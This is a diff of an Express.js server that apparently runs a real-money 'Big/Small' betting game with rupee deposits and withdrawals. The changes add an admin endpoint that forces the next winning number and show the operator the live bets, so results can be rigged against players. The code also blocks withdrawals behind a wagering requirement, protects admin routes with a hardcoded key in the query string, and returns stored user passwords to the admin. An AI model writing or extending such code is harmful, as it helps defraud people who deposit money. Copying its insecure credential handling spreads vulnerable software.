@@ -1,7 +1,6 @@
 const express = require('express');
 const fs = require('fs');
 const path = require('path');
-const https = require('https');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -35,7 +34,7 @@ setInterval(() => {
         currentPeriod = p;
         
         let winNum = (forcedNum !== null && forcedNum !== undefined) ? forcedNum : Math.floor(Math.random() * 10);
-        forcedNum = null; // Reset forced result after applying
+        forcedNum = null; // Auto reset forced result after applying once
         let winResult = winNum >= 5 ? "Big" : "Small";
         
         if (!db.history) db.history = [];
@@ -120,15 +119,22 @@ app.post('/api/deposit', (req, res) => {
     res.json({ success: true, message: "Deposit request submitted successfully!" });
 });
 
+// Instant Balance Deduction on Withdrawal Request
 app.post('/api/withdraw', (req, res) => {
     const { phone, amt, bank, holder, acc, ifsc } = req.body;
     let wdAmt = Number(amt);
     if (wdAmt < 100) return res.json({ success: false, message: "Minimum Withdrawal is ₹100!" });
     let u = db.users[phone];
     if (!u) return res.json({ success: false, message: "User not found!" });
+    if (u.balance < wdAmt) return res.json({ success: false, message: "Insufficient balance for withdrawal!" });
+    
     let totalDep = u.totalDeposit || 0;
     let totalWag = u.totalWagered || 0;
     if (totalWag < totalDep) return res.json({ success: false, message: `Please complete game play of remaining ₹${totalDep - totalWag} before withdrawal!` });
+    
+    // Deduct balance instantly
+    u.balance -= wdAmt;
+
     if (!db.withdrawals) db.withdrawals = [];
     db.withdrawals.push({ phone, amt: wdAmt, bank, holder, acc, ifsc, status: 'Pending', time: new Date() });
     saveDB();
@@ -158,27 +164,35 @@ app.post('/api/admin/login', (req, res) => {
 app.get('/api/admin/data', (req, res) => {
     if (req.query.key !== 'SEC_ADM_8899') return res.json({ success: false });
     let uList = Object.values(db.users || {});
-    let refList = uList.filter(u => u.referredBy).map(u => ({ referrer: u.referredBy, referred: u.phone }));
+    let curBets = (db.bets || []).filter(b => b.period === currentPeriod).reverse();
     res.json({
         success: true,
         period: currentPeriod,
         timer: timerSeconds,
         onlineUsers: uList.length,
         totalReg: uList.length,
+        forcedResult: forcedNum,
         users: uList,
         deposits: db.deposits || [],
         withdrawals: db.withdrawals || [],
-        referrals: refList,
+        liveBets: curBets,
         settings: db.settings || {}
     });
 });
 
+app.get('/api/admin/user-details', (req, res) => {
+    if (req.query.key !== 'SEC_ADM_8899') return res.json({ success: false });
+    let phone = req.query.phone;
+    let u = db.users[phone];
+    if (!u) return res.json({ success: false, message: "User not found!" });
+    let uBets = (db.bets || []).filter(b => b.phone === phone).reverse();
+    res.json({ success: true, user: u, bets: uBets });
+});
+
 app.post('/api/admin/force-result', (req, res) => {
     if (req.body.key !== 'SEC_ADM_8899') return res.json({ success: false });
-    if (req.body.num !== undefined) forcedNum = req.body.num;
-    else if (req.body.bs === 'Big') forcedNum = Math.floor(Math.random() * 5) + 5;
-    else if (req.body.bs === 'Small') forcedNum = Math.floor(Math.random() * 5);
-    res.json({ success: true, message: "Next period result forced successfully!" });
+    forcedNum = Number(req.body.num);
+    res.json({ success: true, message: `Result forced to ${forcedNum} for next period!` });
 });
 
 app.post('/api/admin/settings', (req, res) => {
@@ -206,12 +220,16 @@ app.post('/api/admin/update-deposit', (req, res) => {
     res.json({ success: true, message: "Deposit " + status });
 });
 
+// Refund balance if withdrawal rejected
 app.post('/api/admin/update-withdraw', (req, res) => {
     if (req.body.key !== 'SEC_ADM_8899') return res.json({ success: false });
     let { index, status } = req.body;
     let wd = db.withdrawals[index];
     if (wd && wd.status === 'Pending') {
         wd.status = status;
+        if (status === 'Rejected' && db.users[wd.phone]) {
+            db.users[wd.phone].balance += Number(wd.amt); // Refund on rejection
+        }
         saveDB();
     }
     res.json({ success: true, message: "Withdrawal " + status });
@@ -222,20 +240,6 @@ app.post('/api/admin/toggle-block', (req, res) => {
     let u = db.users[req.body.phone];
     if (u) { u.blocked = !u.blocked; saveDB(); }
     res.json({ success: true, message: "User status updated" });
-});
-
-app.post('/api/admin/change-pass', (req, res) => {
-    if (req.body.key !== 'SEC_ADM_8899') return res.json({ success: false });
-    let u = db.users[req.body.phone];
-    if (u) { u.password = req.body.newPass; saveDB(); }
-    res.json({ success: true, message: "Password updated successfully" });
-});
-
-app.post('/api/admin/give-bonus', (req, res) => {
-    if (req.body.key !== 'SEC_ADM_8899') return res.json({ success: false });
-    let u = db.users[req.body.phone];
-    if (u) { u.balance += Number(req.body.bonus); saveDB(); }
-    res.json({ success: true, message: "Bonus credited successfully" });
 });
 
 app.listen(PORT, () => { console.log('Server running on port ' + PORT); });
